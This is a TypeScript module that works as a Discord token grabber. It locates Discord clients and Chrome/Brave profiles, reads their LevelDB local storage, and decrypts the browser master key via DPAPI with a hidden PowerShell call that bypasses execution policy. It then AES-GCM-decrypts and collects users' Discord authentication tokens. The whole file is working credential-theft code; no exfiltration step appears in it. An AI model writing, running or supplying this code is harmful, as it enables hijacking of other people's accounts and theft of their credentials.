import fs from 'fs'
import path from 'path'
import { exec } from 'child_process'
import { promisify } from 'util'
import crypto from 'crypto'

const execAsync = promisify(exec)

const REGEX_ENCRYPTED = /dQw4w9WgXcQ:([^" ]*)/g
const REGEX_UNENCRYPTED = /([\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84})/g

export async function discoverTokens(): Promise<string[]> {
    const tokens: string[] = []
    const roaming = process.env.APPDATA || ''
    const local = process.env.LOCALAPPDATA || ''

    console.log('🔍 Token Discovery Started')
    console.log(`📁 APPDATA: ${roaming}`)
    console.log(`📁 LOCALAPPDATA: ${local}`)

    const paths = {
        'Discord': path.join(roaming, 'discord'),
        'Discord Canary': path.join(roaming, 'discordcanary'),
        'Discord PTB': path.join(roaming, 'discordptb'),
        'Google Chrome': path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
        'Brave': path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    }

    for (const [name, p] of Object.entries(paths)) {
        console.log(`\n🔎 Checking ${name}: ${p}`)
        
        if (!fs.existsSync(p)) {
            console.log(`  ❌ Path not found`)
            continue
        }
        console.log(`  ✅ Path exists`)

        const leveldb = path.join(p, 'Local Storage', 'leveldb')
        if (!fs.existsSync(leveldb)) {
            console.log(`  ❌ LevelDB not found`)
            continue
        }
        console.log(`  ✅ LevelDB found`)

        const masterKey = await getMasterKey(p)
        if (!masterKey) {
            console.log(`  ❌ Master key not found`)
            continue
        }
        console.log(`  ✅ Master key extracted`)

        const encryptedTokens = extractEncryptedTokens(leveldb)
        console.log(`  🔐 Found ${encryptedTokens.length} token(s)`)
        
        for (const enc of encryptedTokens) {
            // Check if it's an unencrypted token
            if (enc.startsWith('UNENCRYPTED:')) {
                const token = enc.replace('UNENCRYPTED:', '')
                if (!tokens.includes(token)) {
                    console.log(`  ✅ Unencrypted token found`)
                    tokens.push(token)
                }
                continue
            }
            
            // Decrypt encrypted token
            const decrypted = decryptToken(enc, masterKey)
            if (decrypted && !tokens.includes(decrypted)) {
                console.log(`  ✅ Token decrypted successfully`)
                tokens.push(decrypted)
            }
        }
    }

    console.log(`\n✅ Total tokens found: ${tokens.length}`)
    return tokens
}

async function getMasterKey(discordPath: string): Promise<Buffer | null> {
    const localStatePath = path.join(discordPath, 'Local State')
    if (!fs.existsSync(localStatePath)) {
        console.log(`  ⚠️  Local State not found`)
        return null
    }

    try {
        const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'))
        
        if (!localState.os_crypt || !localState.os_crypt.encrypted_key) {
            console.log(`  ⚠️  No encrypted_key in Local State`)
            return null
        }

        const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64')
        console.log(`  🔐 Encrypted key length: ${encryptedKey.length}`)

        // The key is prefixed with 'DPAPI' (5 bytes)
        if (encryptedKey.slice(0, 5).toString() !== 'DPAPI') {
            console.log(`  ⚠️  Invalid key prefix: ${encryptedKey.slice(0, 5).toString()}`)
            return null
        }

        const key = encryptedKey.slice(5)
        console.log(`  🔑 Key to decrypt length: ${key.length}`)

        // Write encrypted key to temp file to avoid command line escaping issues
        const tempFile = path.join(process.env.TEMP || '', `dpapi_${Date.now()}.txt`)
        fs.writeFileSync(tempFile, key.toString('base64'))

        try {
            // Use PowerShell to decrypt the key via DPAPI (async)
            const psCommand = `
                Add-Type -AssemblyName System.Security;
                $base64 = Get-Content '${tempFile}';
                $encryptedBytes = [System.Convert]::FromBase64String($base64);
                $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);
                [System.Convert]::ToBase64String($decryptedBytes);
            `.replace(/\n/g, ' ')

            const { stdout } = await execAsync(`powershell -NoProfile -ExecutionPolicy Bypass -Command "${psCommand}"`, {
                windowsHide: true
            })

            const decryptedKeyBase64 = stdout.trim()
            console.log(`  ✅ Master key decrypted (length: ${decryptedKeyBase64.length})`)
            return Buffer.from(decryptedKeyBase64, 'base64')
        } finally {
            // Clean up temp file
            if (fs.existsSync(tempFile)) {
                fs.unlinkSync(tempFile)
            }
        }
    } catch (e) {
        console.error('  ❌ Failed to get master key:', e)
        return null
    }
}

function extractEncryptedTokens(leveldbPath: string): string[] {
    const encrypted: string[] = []
    const files = fs.readdirSync(leveldbPath)

    for (const file of files) {
        if (!file.endsWith('.log') && !file.endsWith('.ldb')) continue

        try {
            const content = fs.readFileSync(path.join(leveldbPath, file), 'utf8')
            
            // Extract encrypted tokens
            let match
            while ((match = REGEX_ENCRYPTED.exec(content)) !== null) {
                encrypted.push(match[1])
            }
            
            // Extract unencrypted tokens
            REGEX_UNENCRYPTED.lastIndex = 0
            while ((match = REGEX_UNENCRYPTED.exec(content)) !== null) {
                // Mark unencrypted tokens with a prefix
                encrypted.push('UNENCRYPTED:' + match[1])
            }
        } catch (e) {
            // Ignore busy files
        }
    }

    return [...new Set(encrypted)]
}

function decryptToken(encrypted: string, masterKey: Buffer): string | null {
    try {
        const buffer = Buffer.from(encrypted, 'base64')
        
        // Check if it starts with 'v10' or 'v11' prefix (3 bytes)
        const version = buffer.slice(0, 3).toString()
        console.log(`    🔓 Decrypting token (version: ${version}, length: ${buffer.length})`)
        
        const iv = buffer.slice(3, 15)
        const payload = buffer.slice(15)

        // In AES-GCM, the last 16 bytes are the authentication tag
        const tag = payload.slice(payload.length - 16)
        const ciphertext = payload.slice(0, payload.length - 16)

        const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv)
        decipher.setAuthTag(tag)

        const decrypted = Buffer.concat([
            decipher.update(ciphertext),
            decipher.final()
        ]).toString('utf8')
        
        console.log(`    ✅ Token decrypted (length: ${decrypted.length})`)
        return decrypted
    } catch (e) {
        console.error('    ❌ Decryption failed:', e)
        return null
    }
}
